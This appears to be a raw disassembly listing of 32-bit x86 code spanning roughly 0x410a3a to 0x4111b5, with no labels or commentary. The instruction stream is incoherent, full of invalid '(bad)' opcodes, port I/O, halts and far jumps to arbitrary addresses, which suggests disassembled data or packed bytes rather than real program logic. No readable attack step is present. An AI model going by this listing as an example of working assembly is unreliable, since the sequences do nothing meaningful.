  410a3a:	aad    0xf9
  410a3c:	(bad)  
  410a3d:	and    ebp,esi
  410a3f:	cwde   
  410a40:	mov    edx,0xa95c82b9
  410a45:	and    eax,0xa22fe6c
  410a4a:	imul   ecx,DWORD PTR [edx-0x46],0xd79387a2
  410a51:	and    dh,BYTE PTR [edi+0x1a]
  410a54:	fcmovnbe st,st(3)
  410a56:	aaa    
  410a57:	and    ebp,DWORD PTR [esi]
  410a59:	aad    0x26
  410a5b:	lods   al,BYTE PTR ds:[esi]
  410a5c:	ss pop esp
  410a5e:	stos   DWORD PTR es:[edi],eax
  410a5f:	dec    edi
  410a60:	pop    esi
  410a61:	sti    
  410a62:	stos   WORD PTR es:[edi],ax
  410a64:	iret   
  410a65:	lock and eax,esi
  410a68:	fbstp  TBYTE PTR [ebx-0x4a0850f0]
  410a6e:	(bad)  
  410a6f:	lods   eax,DWORD PTR ds:[esi]
  410a70:	xchg   DWORD PTR [eax-0x1e781344],edi
  410a76:	fstp   DWORD PTR [eax+0x2e]
  410a79:	popa   
  410a7a:	push   esi
  410a7b:	mov    bh,0x9b
  410a7d:	cld    
  410a7e:	inc    ebp
  410a7f:	push   esp
  410a80:	xlat   BYTE PTR ds:[ebx]
  410a81:	cld    
  410a82:	cmp    eax,0x9176f188
  410a87:	mov    BYTE PTR [ebx+eiz*8+0x3d80de23],dl
  410a8e:	cli    
  410a8f:	pop    edx
  410a90:	imul   edx,DWORD PTR cs:[ebx],0x7
  410a94:	xor    al,0x5c
  410a96:	aas    
  410a97:	cmp    DWORD PTR [ebx-0x48],edi
  410a9a:	idiv   BYTE PTR [edi*4+0x13e75b4e]
  410aa1:	hlt    
  410aa2:	clc    
  410aa3:	sub    dh,bl
  410aa5:	into   
  410aa6:	adc    DWORD PTR [edi-0xffc9d2c],ebp
  410aac:	mov    BYTE PTR [eax+0x6bc222c],cl
  410ab2:	ins    DWORD PTR es:[edi],dx
  410ab3:	lods   al,BYTE PTR ds:[esi]
  410ab4:	and    edi,esi
  410ab6:	push   ds
  410ab7:	sbb    al,0x9b
  410ab9:	inc    edi
  410aba:	ret    0x8a16
  410abd:	ins    BYTE PTR es:[edi],dx
  410abe:	or     eax,0xb22e4af9
  410ac3:	push   ecx
  410ac4:	push   ebx
  410ac5:	mov    dh,0x25
  410ac7:	cs into 
  410ac9:	mov    cl,0x6a
  410acb:	cld    
  410acc:	rcr    DWORD PTR [ebp+edx*4+0x7d],0x89
  410ad1:	xor    eax,0x1117219f
  410ad6:	out    0x56,al
  410ad8:	stos   DWORD PTR es:[edi],eax
  410ad9:	pop    edi
  410ada:	(bad)  
  410adb:	stc    
  410adc:	hlt    
  410add:	out    0x64,al
  410adf:	xor    bl,BYTE PTR cs:[eax-0x58]
  410ae3:	jo     0x924dd04f
  410ae9:	xchg   ecx,eax
  410aea:	or     esp,edi
  410aec:	sbb    eax,DWORD PTR ds:0xbd9014d7
  410af2:	dec    eax
  410af3:	cmp    esi,DWORD PTR [edx]
  410af5:	(bad)  [ebp+edi*1+0x78]
  410af9:	in     al,0x8d
  410afb:	std    
  410afc:	add    eax,ebp
  410afe:	xchg   esi,eax
  410aff:	sub    al,0xbf
  410b01:	push   ds
  410b02:	sar    BYTE PTR [edx+0x0],1
  410b05:	or     ebp,DWORD PTR [esi-0x3b]
  410b08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b09:	sub    DWORD PTR [eax-0x44cde7fd],0x7442cc6e
  410b13:	mov    bh,dl
  410b15:	sub    al,0x1e
  410b17:	and    bl,cl
  410b19:	dec    eax
  410b1a:	xor    esi,DWORD PTR [esi-0x4f]
  410b1d:	push   ecx
  410b1e:	imul   edx,DWORD PTR [edi+0x47c744d8],0xf5e6a6b0
  410b28:	add    edx,ebp
  410b2a:	sbb    DWORD PTR [esp+esi*2-0x468b2ed7],ebx
  410b31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b32:	das    
  410b33:	sbb    eax,0xe5ef652c
  410b38:	pop    edi
  410b39:	or     DWORD PTR [ebx],esp
  410b3b:	rcr    DWORD PTR [ecx-0x96d6ba],0xfe
  410b42:	jmp    0x69a90dd
  410b47:	test   BYTE PTR [edi-0xaa0a668],ah
  410b4d:	mov    esp,DWORD PTR ds:0xe050b9f4
  410b53:	ror    DWORD PTR [ebp+0x32],cl
  410b56:	dec    edx
  410b57:	pop    esp
  410b58:	xchg   DWORD PTR [esi+ebx*1+0x6c],esi
  410b5c:	xchg   ecx,eax
  410b5d:	push   ebx
  410b5e:	xchg   edi,eax
  410b5f:	aad    0x6f
  410b61:	out    0xa1,al
  410b63:	push   ebp
  410b64:	popa   
  410b65:	mov    al,ds:0xc540ec88
  410b6a:	push   ss
  410b6b:	hlt    
  410b6c:	sbb    al,0x67
  410b6e:	cmp    al,0x17
  410b70:	sub    edi,DWORD PTR [edx+0x14b21a31]
  410b76:	xlat   BYTE PTR ds:[ebx]
  410b77:	or     ch,0xf7
  410b7a:	pop    ebx
  410b7b:	push   0x3f
  410b7d:	adc    ebp,eax
  410b7f:	add    al,0xc1
  410b81:	mov    eax,ds:0x6d320285
  410b86:	pop    ss
  410b87:	sbb    eax,0xe964c25e
  410b8c:	repnz mov DWORD PTR ds:0xecfee31a,ebx
  410b93:	ror    ebx,cl
  410b95:	data16 scas al,BYTE PTR es:[edi]
  410b97:	lahf   
  410b98:	cmc    
  410b99:	pop    es
  410b9a:	cli    
  410b9b:	mov    ebp,0x50cfc578
  410ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ba1:	xchg   BYTE PTR [edx+0x2d9e951e],dl
  410ba7:	xchg   esi,eax
  410ba8:	icebp  
  410ba9:	fadd   DWORD PTR [eax+0x32]
  410bac:	push   ebx
  410bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bae:	das    
  410baf:	in     al,dx
  410bb0:	call   0x12eb:0x7719bc6b
  410bb7:	jbe    0x410b44
  410bb9:	mov    eax,ds:0x26ddcc80
  410bbe:	and    BYTE PTR [edi+0x1f],ch
  410bc1:	test   ebx,esp
  410bc3:	jecxz  0x410c03
  410bc5:	fdivr  QWORD PTR [eax-0x13ceabd1]
  410bcb:	or     cl,0x18
  410bce:	test   DWORD PTR [eax-0x4a04901b],ebp
  410bd4:	outs   dx,DWORD PTR ds:[esi]
  410bd5:	or     eax,0x70738073
  410bda:	fsin   
  410bdc:	out    dx,eax
  410bdd:	or     al,0x40
  410bdf:	mov    ds:0x7cf9fb,al
  410be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410be5:	das    
  410be6:	inc    ebx
  410be7:	xor    al,0x6b
  410be9:	unpcklps xmm6,XMMWORD PTR [eax-0x5b]
  410bed:	stos   BYTE PTR es:[edi],al
  410bee:	pop    es
  410bef:	adc    BYTE PTR [eax+0x38],0x6c
  410bf3:	push   esp
  410bf4:	dec    eax
  410bf5:	jp     0x410be7
  410bf7:	push   ecx
  410bf8:	fiadd  WORD PTR [ebx-0x21]
  410bfb:	sbb    ebx,DWORD PTR [edi-0x64]
  410bfe:	jg     0x410bec
  410c00:	inc    ecx
  410c01:	mov    ebp,0x89d8eec3
  410c06:	fst    QWORD PTR [eax]
  410c08:	mov    al,0x1f
  410c0a:	in     al,dx
  410c0b:	adc    al,0xbe
  410c0d:	xchg   edx,eax
  410c0e:	call   FWORD PTR [eax]
  410c10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c11:	inc    ecx
  410c12:	ror    dl,cl
  410c14:	xchg   edi,eax
  410c15:	rcl    DWORD PTR [ecx-0x14290b9e],0x66
  410c1c:	inc    BYTE PTR [ebx-0x56]
  410c1f:	xchg   ecx,eax
  410c20:	push   ds
  410c21:	cmp    DWORD PTR [ecx],0xffffff92
  410c24:	fadd   QWORD PTR [ebp+0x44]
  410c27:	retf   0x341f
  410c2a:	adc    ecx,edi
  410c2c:	push   edx
  410c2d:	adc    eax,0x378e511d
  410c32:	stos   BYTE PTR es:[edi],al
  410c33:	jnp    0x410c81
  410c35:	sub    esi,DWORD PTR [eax+0x64]
  410c38:	add    BYTE PTR [ebx+0x22d4521a],al
  410c3e:	fiadd  DWORD PTR [ebp-0x52c5fe26]
  410c44:	add    eax,DWORD PTR [edx+0x2e]
  410c47:	aas    
  410c48:	inc    esp
  410c49:	scas   eax,DWORD PTR es:[edi]
  410c4a:	mov    ebx,0x9d925d92
  410c4f:	(bad)  
  410c50:	xchg   esp,eax
  410c51:	xchg   DWORD PTR [eax*8-0x53dd2f18],ecx
  410c58:	push   ss
  410c59:	enter  0xa8e5,0x92
  410c5d:	lods   eax,DWORD PTR ds:[esi]
  410c5e:	mov    al,ds:0x13ee71e5
  410c63:	out    0xad,al
  410c65:	sbb    ch,BYTE PTR [ebp+0x7c]
  410c68:	enter  0x8d7c,0xfc
  410c6c:	sbb    eax,0x85779821
  410c71:	jmp    0x410c98
  410c73:	sti    
  410c74:	fist   WORD PTR [ebx]
  410c76:	iret   
  410c77:	mov    ah,0x8
  410c79:	pusha  
  410c7a:	(bad)  
  410c7b:	jge    0x410bfd
  410c7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c7e:	scas   al,BYTE PTR es:[edi]
  410c7f:	add    ebp,DWORD PTR [ebp-0x75]
  410c82:	gs mov edi,esp
  410c85:	jmp    DWORD PTR [ebx+0x29]
  410c88:	inc    ecx
  410c89:	inc    ecx
  410c8a:	les    esi,FWORD PTR [edx-0x2fe0b9b1]
  410c90:	push   cs
  410c91:	add    al,0xb9
  410c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c94:	jecxz  0x410cbd
  410c96:	fidivr DWORD PTR [ebp-0x1fa40196]
  410c9c:	and    esp,edx
  410c9e:	lds    ebx,FWORD PTR [esi+edx*1-0x36]
  410ca2:	sub    eax,0x42ddc195
  410ca7:	fldenv [edx+edx*2-0x47]
  410cab:	jns    0x410cf5
  410cad:	push   0xa0196a39
  410cb2:	repnz in eax,dx
  410cb4:	dec    esi
  410cb5:	sbb    ebp,DWORD PTR [eax*2+0x4d30776f]
  410cbc:	sub    eax,0x841fe8e
  410cc1:	mov    ebp,0xf14a970
  410cc6:	aaa    
  410cc7:	fidivr WORD PTR [edx+0x4f]
  410cca:	out    0xa8,al
  410ccc:	mov    cs,WORD PTR [esi]
  410cce:	push   ds
  410ccf:	push   esp
  410cd0:	xchg   BYTE PTR [edi+0x288309ed],bl
  410cd6:	(bad)  
  410cd7:	cmc    
  410cd8:	gs jg  0x410cff
  410cdb:	mov    gs,edi
  410cdd:	fsub   DWORD PTR [edi+0x55]
  410ce0:	imul   ebx,DWORD PTR [edi],0xffffff88
  410ce3:	jnp    0x410cff
  410ce5:	add    al,0xe1
  410ce7:	loope  0x410cac
  410ce9:	(bad)  
  410cea:	shl    BYTE PTR [edx-0x534f1565],cl
  410cf0:	shl    ebx,1
  410cf2:	sub    eax,0x66fdf908
  410cf7:	mov    esi,0x66da44
  410cfc:	mov    dl,0x8f
  410cfe:	add    dh,ch
  410d00:	inc    esp
  410d01:	scas   eax,DWORD PTR es:[edi]
  410d02:	push   ecx
  410d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d04:	not    BYTE PTR [eax+edx*8+0x5b]
  410d08:	lea    edx,[ebp+0xa]
  410d0b:	xchg   edx,eax
  410d0c:	pop    ebp
  410d0d:	add    BYTE PTR [ecx-0x46],cl
  410d10:	addr16 cdq 
  410d12:	mov    ds:0x6094d6a5,eax
  410d17:	repnz hlt 
  410d19:	(bad)  
  410d1a:	fild   WORD PTR [ebx+ecx*2-0x2d89e15c]
  410d21:	es (bad) 
  410d23:	jmp    FWORD PTR [edi]
  410d25:	pop    es
  410d26:	pop    ds
  410d27:	or     esi,edi
  410d29:	aaa    
  410d2a:	jmp    0xf7645e6a
  410d2f:	in     eax,0x66
  410d31:	sbb    BYTE PTR [edi+ebx*4],bl
  410d34:	bound  esp,QWORD PTR [edx]
  410d36:	xlat   BYTE PTR ds:[ebx]
  410d37:	nop
  410d38:	adc    BYTE PTR [esi+0x1e],dh
  410d3b:	jle    0x410d37
  410d3d:	aas    
  410d3e:	dec    eax
  410d3f:	ret    
  410d40:	pop    ebp
  410d41:	xchg   edi,eax
  410d42:	rol    dl,0xa9
  410d45:	in     al,dx
  410d46:	(bad)  
  410d47:	retf   
  410d48:	adc    eax,0xeed9abf9
  410d4d:	jne    0x410db0
  410d4f:	dec    DWORD PTR [eax]
  410d51:	xchg   esp,eax
  410d52:	mov    ds:0xf5501c8e,eax
  410d57:	test   DWORD PTR [ebx+0x5d],ebx
  410d5a:	clc    
  410d5b:	scas   eax,DWORD PTR es:[edi]
  410d5c:	push   cs
  410d5d:	out    dx,eax
  410d5e:	ror    BYTE PTR [ebx+0x15],cl
  410d61:	pushf  
  410d62:	loope  0x410d14
  410d64:	stos   BYTE PTR es:[edi],al
  410d65:	aaa    
  410d66:	shl    BYTE PTR ds:0xb8592ca,1
  410d6c:	stc    
  410d6d:	xor    eax,0xb49cc71f
  410d72:	ins    DWORD PTR es:[edi],dx
  410d73:	sbb    esi,esp
  410d75:	inc    edi
  410d76:	ficom  WORD PTR [ebp+0x61]
  410d79:	mov    al,0x5c
  410d7c:	mov    edx,0x150ad3e9
  410d81:	pop    ss
  410d82:	push   ebp
  410d83:	xor    eax,0xcca7e237
  410d88:	xchg   esp,eax
  410d89:	inc    esi
  410d8a:	rcr    bh,cl
  410d8c:	test   DWORD PTR [edx-0x6779be1f],0x47dcf14f
  410d96:	je     0x410d81
  410d98:	bound  edi,QWORD PTR [eax]
  410d9a:	ins    DWORD PTR es:[edi],dx
  410d9b:	pop    esi
  410d9c:	scas   eax,DWORD PTR es:[edi]
  410d9d:	cdq    
  410d9e:	setno  BYTE PTR [ecx]
  410da1:	adc    al,0xd4
  410da3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410da4:	test   bl,ah
  410da6:	lds    eax,FWORD PTR [eax]
  410da8:	cmc    
  410da9:	mov    ch,0x1
  410dab:	cdq    
  410dac:	inc    ebx
  410dad:	xor    DWORD PTR [esi+0x50e2eebb],esi
  410db3:	xchg   DWORD PTR [ebx+0x28e6c3b0],edi
  410db9:	sub    eax,0xa918572f
  410dbe:	shr    DWORD PTR [ebx+0x19],1
  410dc1:	or     eax,0xd09dcf46
  410dc6:	pop    edi
  410dc7:	pop    ds
  410dc8:	test   eax,0x3ff01288
  410dcd:	pop    ss
  410dce:	test   BYTE PTR [ebx+ebp*1],0x3c
  410dd2:	test   al,0xb6
  410dd4:	sbb    edx,DWORD PTR [eax+0x4f4e44e6]
  410dda:	lea    ebx,[esi+ecx*1-0x342085f7]
  410de1:	mov    bh,0x29
  410de3:	enter  0x3316,0x67
  410de7:	retf   
  410de8:	dec    esi
  410de9:	ret    
  410dea:	dec    ecx
  410deb:	add    edi,DWORD PTR [ecx]
  410ded:	aas    
  410dee:	push   ds
  410def:	sbb    BYTE PTR [ebx],dh
  410df1:	sbb    DWORD PTR [esi-0x347348fe],0xffffffd8
  410df8:	cmp    bh,0xab
  410dfb:	xor    esi,DWORD PTR [edi-0x2e]
  410dfe:	outs   dx,DWORD PTR ds:[esi]
  410dff:	inc    ebx
  410e00:	xlat   BYTE PTR ds:[ebx]
  410e01:	jecxz  0x410de7
  410e03:	jbe    0x410dc9
  410e05:	cld    
  410e06:	inc    ebx
  410e07:	fwait
  410e08:	iret   
  410e09:	inc    ebx
  410e0a:	imul   DWORD PTR [eax]
  410e0c:	mov    dh,0x30
  410e0e:	pop    edx
  410e0f:	push   edx
  410e10:	xchg   ebp,eax
  410e11:	cdq    
  410e12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e13:	enter  0xb32d,0xa2
  410e17:	call   0x66ab3980
  410e1c:	pop    ecx
  410e1d:	push   edi
  410e1e:	lea    ebp,[edx]
  410e20:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  410e22:	or     DWORD PTR [ebx+0x6371d931],0xffffffb7
  410e29:	push   ebp
  410e2a:	outs   dx,DWORD PTR ds:[esi]
  410e2b:	xlat   BYTE PTR ds:[ebx]
  410e2c:	and    cl,BYTE PTR [esi+esi*2-0x25a02b99]
  410e33:	inc    eax
  410e34:	mov    cl,BYTE PTR [ebp-0x69]
  410e37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e38:	dec    esp
  410e39:	pop    ecx
  410e3a:	push   esi
  410e3b:	add    eax,0xfaf5dac1
  410e40:	push   eax
  410e41:	and    al,0x7b
  410e43:	sbb    esi,edi
  410e45:	and    edx,DWORD PTR [eax-0x11]
  410e48:	rol    cl,cl
  410e4a:	pop    ebp
  410e4b:	push   esp
  410e4c:	iret   
  410e4d:	ins    DWORD PTR es:[edi],dx
  410e4e:	adc    eax,0x289de4d6
  410e53:	sub    eax,0x84a62e7b
  410e58:	dec    esi
  410e59:	xlat   BYTE PTR ds:[ebx]
  410e5a:	xchg   edi,eax
  410e5b:	adc    ebx,DWORD PTR [ecx-0x13]
  410e5e:	je     0x410e6d
  410e60:	leave  
  410e61:	jo     0x410df9
  410e63:	pop    edi
  410e64:	test   DWORD PTR [edx],ebx
  410e66:	dec    ebp
  410e67:	mov    ebx,0xe4c29017
  410e6c:	loopne 0x410ede
  410e6e:	outs   dx,BYTE PTR ds:[esi]
  410e6f:	pop    ebp
  410e70:	rol    esp,cl
  410e72:	pop    edi
  410e73:	and    DWORD PTR [ebx],eax
  410e75:	pop    esp
  410e76:	or     eax,0x214cca68
  410e7b:	sbb    dl,0x1b
  410e7e:	loop   0x410e4b
  410e80:	mov    esi,0x72484925
  410e85:	ins    DWORD PTR es:[edi],dx
  410e86:	mov    eax,0x39ceac9e
  410e8b:	dec    edx
  410e8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e8d:	ds iret 
  410e8f:	fcom   DWORD PTR [ecx+0x1]
  410e92:	push   edi
  410e93:	call   0xc614:0x3f57b2e0
  410e9a:	stc    
  410e9b:	push   ebp
  410e9c:	aas    
  410e9d:	add    edi,DWORD PTR [ecx+ebx*8+0x3c5c110e]
  410ea4:	out    0x93,al
  410ea6:	pop    ecx
  410ea7:	jbe    0x410f11
  410ea9:	mov    eax,ds:0xe50e9ebd
  410eae:	mov    WORD PTR [ebp+0x62],?
  410eb1:	jmp    0x25f8c65
  410eb6:	jecxz  0x410e5f
  410eb8:	pause  
  410eba:	sar    BYTE PTR [esi-0x4d],1
  410ebd:	addr16 (bad) 
  410ebf:	lods   al,BYTE PTR ds:[esi]
  410ec0:	daa    
  410ec1:	mov    esp,0xf73535cb
  410ec6:	inc    ecx
  410ec7:	mov    edx,0xe86d3476
  410ecc:	mov    dh,0xdc
  410ece:	nop
  410ecf:	fmul   QWORD PTR [edi]
  410ed1:	int3   
  410ed2:	rep lods al,BYTE PTR ds:[esi]
  410ed4:	enter  0xbd6e,0xf2
  410ed8:	mov    ebp,0x32735270
  410edd:	cmp    DWORD PTR [edi-0xe],edx
  410ee0:	das    
  410ee1:	dec    eax
  410ee2:	jb     0x410ef2
  410ee4:	cld    
  410ee5:	mov    dl,0xa1
  410ee7:	xor    DWORD PTR [edx+0x202c5f88],eax
  410eed:	or     al,0x43
  410eef:	adc    ebp,DWORD PTR [edx+0xd]
  410ef2:	mov    ebx,0x4d69787
  410ef7:	mov    eax,0xaf44335c
  410efc:	das    
  410efd:	push   ss
  410efe:	pusha  
  410eff:	mov    eax,0x91e7ee3
  410f04:	push   0xb4862002
  410f09:	jmp    0x4ca7b466
  410f0e:	popf   
  410f0f:	pop    ebx
  410f10:	les    esp,FWORD PTR [ebp-0x7e845577]
  410f16:	jmp    0x356d:0x6ff064a2
  410f1d:	lods   al,BYTE PTR ds:[esi]
  410f1e:	xchg   edx,eax
  410f1f:	shl    DWORD PTR [edi-0x27],0x60
  410f23:	out    0xfb,eax
  410f25:	(bad)  
  410f26:	loop   0x410f8b
  410f28:	jecxz  0x410eb8
  410f2a:	push   eax
  410f2b:	dec    edi
  410f2c:	cmp    edx,edx
  410f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f2f:	and    al,0x9b
  410f31:	pop    ebx
  410f32:	and    al,0x3d
  410f34:	into   
  410f35:	mov    esi,0xbae6908a
  410f3a:	rcr    BYTE PTR ds:0xa63ed5a3,0xb1
  410f41:	in     eax,dx
  410f42:	in     eax,0xa
  410f44:	mov    DWORD PTR [ecx-0x39de082e],ecx
  410f4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f4b:	imul   ecx,DWORD PTR [eax],0x61
  410f4e:	shl    BYTE PTR [ecx],0x5
  410f51:	add    DWORD PTR [ecx],esi
  410f53:	mov    ebx,0x498170ab
  410f58:	and    ah,BYTE PTR [edi-0x1f]
  410f5b:	push   0x6df4fc85
  410f60:	mov    BYTE PTR [edi],bh
  410f62:	enter  0xd9df,0x89
  410f66:	mov    edx,0x12dbcd38
  410f6b:	gs stc 
  410f6d:	je     0x410fec
  410f6f:	mov    bl,0xec
  410f71:	xchg   ah,ah
  410f73:	mov    ebp,0xbdd30bb9
  410f78:	je     0x410f86
  410f7a:	jo     0x410fa0
  410f7c:	jae    0x410f32
  410f7e:	jb     0x410f85
  410f80:	lods   eax,DWORD PTR ds:[esi]
  410f81:	sbb    eax,0xc3b90894
  410f86:	pop    edi
  410f87:	xchg   BYTE PTR [esi],dh
  410f89:	jp     0x410ff3
  410f8b:	scas   al,BYTE PTR es:[edi]
  410f8c:	push   ecx
  410f8d:	push   ecx
  410f8e:	jge    0x410f35
  410f90:	lock jbe 0x410f32
  410f93:	rol    BYTE PTR [edi+ecx*8],cl
  410f96:	lods   al,BYTE PTR ds:[esi]
  410f97:	dec    ebp
  410f98:	call   0xc3c1:0xd602ace
  410f9f:	shl    BYTE PTR [edi+0x50],1
  410fa2:	mov    ah,0x38
  410fa4:	push   ebx
  410fa5:	in     eax,0x96
  410fa7:	sub    eax,0x3589b28a
  410fac:	push   esi
  410fad:	add    bl,bl
  410faf:	stos   DWORD PTR es:[edi],eax
  410fb0:	fidivr WORD PTR [ebx-0x2ebc2927]
  410fb6:	mov    edi,0xa4cbcfc5
  410fbb:	or     ebp,esp
  410fbd:	sar    dh,cl
  410fbf:	sbb    edi,edx
  410fc1:	out    dx,al
  410fc2:	icebp  
  410fc3:	std    
  410fc4:	test   DWORD PTR [edx-0x5f],edx
  410fc7:	mov    BYTE PTR ds:0xd21cd138,al
  410fcd:	stos   DWORD PTR es:[edi],eax
  410fce:	mov    DWORD PTR ds:0xf3251711,edi
  410fd4:	push   0xffffff97
  410fd6:	gs scas al,BYTE PTR es:[edi]
  410fd8:	push   cs
  410fd9:	xor    al,0x54
  410fdb:	dec    edx
  410fdc:	cmp    eax,DWORD PTR [ebx+0x65]
  410fdf:	push   0x385ec982
  410fe4:	pop    edi
  410fe5:	push   esp
  410fe6:	mov    bl,0xb0
  410fe8:	cmp    ecx,esi
  410fea:	retf   0xd161
  410fed:	das    
  410fee:	rcl    DWORD PTR [ecx+eax*1+0x54c19ce],0x8e
  410ff6:	mov    ?,WORD PTR [edx+0x18125f96]
  410ffc:	ins    DWORD PTR es:[edi],dx
  410ffd:	push   eax
  410ffe:	pop    edx
  410fff:	add    ah,BYTE PTR ds:0xee4cf04a
  411005:	adc    ebp,DWORD PTR [edi]
  411007:	call   0x9d797401
  41100c:	sbb    al,0xc2
  41100e:	inc    esp
  41100f:	lods   eax,DWORD PTR ds:[esi]
  411010:	add    ebp,edx
  411012:	cmp    ah,dl
  411014:	mov    ecx,0x85841906
  411019:	mov    ds:0x8472e127,eax
  41101e:	sar    ebp,1
  411020:	lahf   
  411021:	pop    edi
  411022:	iret   
  411023:	in     al,dx
  411024:	icebp  
  411025:	loop   0x411007
  411027:	or     DWORD PTR [edi],esi
  411029:	sbb    cl,BYTE PTR ds:0xa8a5f5f2
  41102f:	enter  0x5810,0xd
  411033:	mov    bh,0xbc
  411035:	adc    esi,DWORD PTR gs:[edx+0x20]
  411039:	call   0x22f3:0x81ce6520
  411040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411041:	xor    esp,ecx
  411043:	jp     0x410fca
  411045:	adc    DWORD PTR [ecx+0x7fa4779b],0x1775efb3
  41104f:	cmp    eax,0xcd165fe4
  411054:	mov    al,BYTE PTR [ecx+eiz*1]
  411057:	cmp    eax,0x49a6dd55
  41105c:	mov    ds:0xc99b8d96,eax
  411061:	sub    al,0xa4
  411063:	js     0x4110ca
  411065:	mov    WORD PTR [ebp+0x4e40a142],cs
  41106b:	and    BYTE PTR [esi-0x65],bh
  41106e:	jne    0x411060
  411070:	inc    edi
  411071:	add    eax,DWORD PTR [ebp+0x4f]
  411074:	xlat   BYTE PTR ds:[ebx]
  411075:	push   ebx
  411076:	sahf   
  411077:	ffree  st(1)
  411079:	dec    eax
  41107a:	add    DWORD PTR [esi+0x1f9321a5],ebp
  411080:	cs inc eax
  411082:	and    eax,0xacdd74bf
  411087:	pop    edx
  411088:	aam    0x3
  41108a:	mov    cl,0x35
  41108c:	pop    ds
  41108d:	jecxz  0x41105a
  41108f:	jno    0x4110a8
  411091:	mov    esi,0xe2e655d7
  411096:	bound  ebp,QWORD PTR [eax]
  411098:	neg    BYTE PTR [edi+ebp*1-0x4901bc92]
  41109f:	fcom   QWORD PTR [ebp-0x58]
  4110a2:	cmp    DWORD PTR ds:0x1f18c6cf,ebp
  4110a8:	aam    0xb9
  4110aa:	pop    esi
  4110ab:	cli    
  4110ac:	and    eax,0x14af93c0
  4110b1:	xor    al,BYTE PTR [ecx-0x58]
  4110b4:	in     al,dx
  4110b5:	test   eax,0xd6932f08
  4110ba:	rol    DWORD PTR [eax+0x68],cl
  4110bd:	retf   0x6d8a
  4110c0:	add    DWORD PTR [esi+0x764a33f6],esi
  4110c6:	outs   dx,BYTE PTR ss:[esi]
  4110c8:	test   al,0xbe
  4110ca:	nop
  4110cb:	daa    
  4110cc:	dec    edi
  4110cd:	pop    ecx
  4110ce:	loop   0x4110d2
  4110d0:	in     al,0x87
  4110d2:	pop    ebp
  4110d3:	mov    ds:0xc8632775,eax
  4110d8:	pusha  
  4110d9:	add    eax,0xba5186ad
  4110de:	mov    ds:0x4ad2591b,eax
  4110e3:	xchg   ecx,eax
  4110e4:	sub    edi,eax
  4110e6:	ins    DWORD PTR es:[edi],dx
  4110e7:	sbb    BYTE PTR [eax+0x33a9b00e],dl
  4110ed:	mov    cl,0x4e
  4110ef:	sub    DWORD PTR [ecx-0x34],ecx
  4110f2:	pop    ecx
  4110f3:	rol    DWORD PTR [ecx-0x69],0xdc
  4110f7:	imul   esp,edx,0xfddcd45c
  4110fd:	loopne 0x41108c
  4110ff:	dec    ecx
  411100:	inc    esi
  411101:	or     al,0x2e
  411103:	and    esp,esi
  411105:	hlt    
  411106:	addr16 mov eax,ds:0x30e
  41110a:	push   0xffffffcd
  41110c:	mov    cl,0x80
  41110e:	loope  0x411144
  411110:	mov    ?,ecx
  411112:	outs   dx,DWORD PTR ds:[esi]
  411113:	push   edi
  411114:	jnp    0x4110be
  411116:	xlat   BYTE PTR ds:[ebx]
  411117:	rcr    bl,cl
  411119:	adc    BYTE PTR [ebx-0x5bb1c108],al
  41111f:	adc    DWORD PTR [esi+0x20c0925c],0xffffff84
  411126:	clc    
  411127:	retf   
  411128:	lock data16 jns 0x4110fc
  41112c:	repnz mov al,0xbf
  41112f:	lahf   
  411130:	xchg   edi,edx
  411132:	cld    
  411133:	xchg   ebx,eax
  411134:	mov    ch,bl
  411136:	loop   0x4110bb
  411138:	out    dx,eax
  411139:	fldcw  WORD PTR ds:0x1485366c
  41113f:	idiv   BYTE PTR [edi]
  411141:	mov    bl,0x95
  411143:	stc    
  411144:	(bad)  
  411145:	std    
  411146:	inc    ebx
  411147:	aaa    
  411148:	idiv   BYTE PTR [edi-0x55]
  41114b:	js     0x4111a8
  41114d:	jae    0x41110e
  41114f:	arpl   WORD PTR [esi],di
  411151:	cdq    
  411152:	test   eax,0x95773942
  411157:	sbb    al,0xbd
  411159:	ja     0x41111a
  41115b:	mov    edi,DWORD PTR [esi]
  41115d:	fiadd  DWORD PTR [ecx-0x28]
  411160:	leave  
  411161:	nop
  411162:	nop
  411163:	je     0x411176
  411165:	xor    eax,0x3e9d59af
  41116a:	inc    esp
  41116b:	add    al,BYTE PTR [eax]
  41116d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41116e:	mov    ecx,0x7f1945a4
  411173:	fwait
  411174:	sbb    DWORD PTR [ecx],eax
  411176:	xchg   ecx,eax
  411177:	xor    bl,ch
  411179:	xchg   esi,eax
  41117a:	add    ebx,DWORD PTR [edi]
  41117c:	inc    ecx
  41117d:	and    DWORD PTR [edi-0x363ad7b3],ebx
  411183:	sti    
  411184:	xor    esi,DWORD PTR [ebx-0x61]
  411187:	sub    DWORD PTR [esi-0x54],esi
  41118a:	frstor [ecx+0x27dee0c5]
  411190:	adc    BYTE PTR [eax-0xd],bh
  411193:	mov    dh,0xf5
  411195:	in     eax,dx
  411196:	xchg   ebp,eax
  411197:	(bad)  
  411198:	xlat   BYTE PTR ds:[ebx]
  411199:	icebp  
  41119a:	jge    0x4111ac
  41119c:	gs jg  0x4111fa
  41119f:	push   0xd47cbb93
  4111a4:	xchg   edx,eax
  4111a5:	lahf   
  4111a6:	xchg   DWORD PTR [esi],ebx
  4111a8:	jno    0x41115d
  4111aa:	pop    eax
  4111ab:	sti    
  4111ac:	xchg   DWORD PTR [eax+0x50223e4d],ebx
  4111b2:	(bad)  
  4111b3:	dec    esi
  4111b4:	inc    eax
  4111b5:	mov    cl,0xd0
